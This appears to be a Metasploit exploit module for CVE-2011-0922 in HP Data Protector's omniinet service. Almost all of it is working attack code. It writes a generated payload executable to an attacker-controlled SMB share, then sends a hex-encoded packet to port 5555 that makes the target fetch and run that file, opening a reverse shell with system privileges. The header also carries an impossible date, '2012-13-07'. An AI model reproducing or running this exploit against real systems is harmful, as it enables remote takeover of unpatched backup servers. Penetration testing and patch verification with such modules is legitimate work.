##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

# Exploit Title: HP Data Protector Client EXEC_CMD Remote Code Execution Vulnerability
# Date: 2012-13-07
# Exploit Author: Ben Turner, Doug McLeod
# Vendor Homepage: www.hp.com
# Version: 6.10 & 6.11 & 6.20
# Tested on: Windows 2003 Server SP2 en
# CVE: CVE-2011-0922
# Notes: ZDI-11-056
# Reference: http://www.zerodayinitiative.com/advisories/ZDI-11-056/
# Reference: http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::EXE	
	include Msf::Auxiliary::Report

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::Client
	XCEPT  = Rex::Proto::SMB::Exceptions
	CONST  = Rex::Proto::SMB::Constants


	def initialize
		super(
			'Name'        => 'HP Data Protector CMD Install Service Vulnerability',
			'Description' => %Q{
				This module exploits HP Data Protector omniinet process on Windows only. This invokes the install service function that allows for a reverse tcp payload to your host. To ensure this works, the SMB server must have a share called Omniback which has a subfolder i386, i.e. \\\\192.168.1.1\\Omniback\\i386\\
			},
			'Author'         => [ 'Ben Turner', 'Doug McLeod' ],
			'License'        => BSD_LICENSE,
			'References'  =>
				[
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'WfsDelay'     => 10,
					'EXITFUNC' => 'process'
				},
			'Payload'     => { 'BadChars' => '', 'DisableNops' => true },
			'Platform'    => ['win'],
			'Targets'         =>
				[
					[ 'HP Data Protector 6.10/6.11/6.20 on Windows', {}]
				],
			'DefaultTarget'   => 0,
			'DisclosureDate' => 'July 29 2013'
		)

		register_options([
			OptString.new('SMBServer', [true, 'The IP address of the SMB server which hosts your share.', 'IPAddress']),
			Opt::RPORT(5555),
		], self.class)

	end

	def exploit

		lhost = "#{datastore['SMBServer']}"
		lhostfull = ""
		lhost.each_char do |character|
			lhostfull = lhostfull << "\x00" << character
		end

		shellcode = "\x00\x00\x01\xbe\xff\xfe\x32\x00\x00\x00\x20"
		shellcode << lhostfull 
		shellcode << "\x00\x00\x00\x20\x00\x30\x00"
		shellcode << "\x00\x00\x20\x00\x53\x00\x59\x00\x53\x00\x54\x00\x45\x00\x4d\x00"
		shellcode << "\x00\x00\x20\x00\x4e\x00\x54\x00\x20\x00\x41\x00\x55\x00\x54\x00"
		shellcode << "\x48\x00\x4f\x00\x52\x00\x49\x00\x54\x00\x59\x00\x00\x00\x20\x00"
		shellcode << "\x43\x00\x00\x00\x20\x00\x32\x00\x36\x00\x00\x00\x20\x00\x5c\x00"
		shellcode << "\x5c"
		shellcode << lhostfull 
		shellcode << "\x00\x5c\x00\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62\x00"
		shellcode << "\x61\x00\x63\x00\x6b\x00\x5c\x00\x69\x00\x33\x00\x38\x00\x36\x00"
		shellcode << "\x5c\x00\x69\x00\x6e\x00\x73\x00\x74\x00\x61\x00\x6c\x00\x6c\x00"
		shellcode << "\x73\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x2e\x00"
		shellcode << "\x65\x00\x78\x00\x65\x00\x20\x00\x2d\x00\x73\x00\x6f\x00\x75\x00"
		shellcode << "\x72\x00\x63\x00\x65\x00\x20\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62"
		shellcode << "\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x5c\x00\x5c"
		shellcode << lhostfull 
		shellcode << "\x5c\x00\x5c\x00\x4f\x00"
		shellcode << "\x6d\x00\x6e\x00\x69\x00\x62\x00\x61\x00\x63\x00\x6b\x00\x5c\x00"
		shellcode << "\x69\x00\x33\x00\x38\x00\x36\x00\x5c\x00\x69\x00\x6e\x00\x73\x00"
		shellcode << "\x74\x00\x61\x00\x6c\x00\x6c\x00\x73\x00\x65\x00\x72\x00\x76\x00"
		shellcode << "\x69\x00\x63\x00\x65\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x20\x00"
		shellcode << "\x2d\x00\x73\x00\x6f\x00\x75\x00\x72\x00\x63\x00\x65\x00\x20\x00"
		shellcode << "\x5c\x00\x5c"
		shellcode << lhostfull 
		shellcode << "\x00\x5c\x00\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62\x00\x61\x00\x63"
		shellcode << "\x00\x6b\x00\x20\x00\x00\x00\x00\x00\x00\x00\x02\x54"
		shellcode << "\xff\xfe\x32\x00\x36\x00\x00\x00\x20\x00\x5b\x00\x30\x00\x5d\x00"
		shellcode << "\x41\x00\x44\x00\x44\x00\x2f\x00\x55\x00\x50\x00\x47\x00\x52\x00"
		shellcode << "\x41\x00\x44\x00\x45\x00\x0a\x00\x5c\x00\x5c"
		shellcode << lhostfull 
		shellcode << "\x00\x5c\x00\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62\x00\x61\x00\x63"
		shellcode << "\x00\x6b\x00\x5c\x00\x69\x00\x33\x00\x38\x00\x36\x00"
		

		def filedrop()
			begin
				origrport = self.datastore['RPORT']
				self.datastore['RPORT'] = 445
				origrhost = self.datastore['RHOST']
				self.datastore['RHOST'] = self.datastore['SMBServer']
				connect()
				smb_login()
				print_status("Generating payload, dropping here: \\\\#{datastore['SMBServer']}\\Omniback\\i386\\installservice.exe'...")
				self.simple.connect("\\\\#{datastore['SMBServer']}\\Omniback")
				exe = generate_payload_exe
				fd = smb_open("\\i386\\installservice.exe", 'rwct')
				fd << exe
				fd.close

				self.datastore['RPORT'] = origrport
				self.datastore['RHOST'] = origrhost
			
			rescue Rex::Proto::SMB::Exceptions::Error => e
				print_error("File did not exist, or could not connect to the SMB share: #{e}\n\n")	
				abort()
			end

			

		end

		def filetest()
			begin
				origrport = self.datastore['RPORT']
				self.datastore['RPORT'] = 445
				origrhost = self.datastore['RHOST']
				self.datastore['RHOST'] = self.datastore['SMBServer']
				connect()
				smb_login()
				print_status("Checking the remote share for: \\\\#{datastore['SMBServer']}\\Omniback\\i386\\installservice.exe'...\n")
				self.simple.connect("\\\\#{datastore['SMBServer']}\\Omniback")
				file = "\\i386\\installservice.exe"
				filetest = smb_file_exist?(file)
				if filetest
					print_good(" Found, upload was succesful! \\\\#{datastore['SMBServer']}\\Omniback\\#{file}")
				else
					print_error("\\\\#{datastore['SMBServer']}\\Omniback\\#{file} - The file does not exist, try again!")
						
				end

				self.datastore['RPORT'] = origrport
				self.datastore['RHOST'] = origrhost
			
			rescue Rex::Proto::SMB::Exceptions::Error => e
				print_error("File did not exist, or could not connect to the SMB share: #{e}\n\n")	
				abort()
			end

			

		end
		begin
			filedrop()
			filetest()
			connect()
			sock.put(shellcode)
			print_status("Waiting ...")
			print_good("Sent :) Good Luck")

		rescue ::Exception => e
			print_error("Could not connect to #{datastore['RHOST']}:#{datastore['RPORT']}\n\n")	
			abort()

			
		
		end
		handler
		#disconnect
	end
end

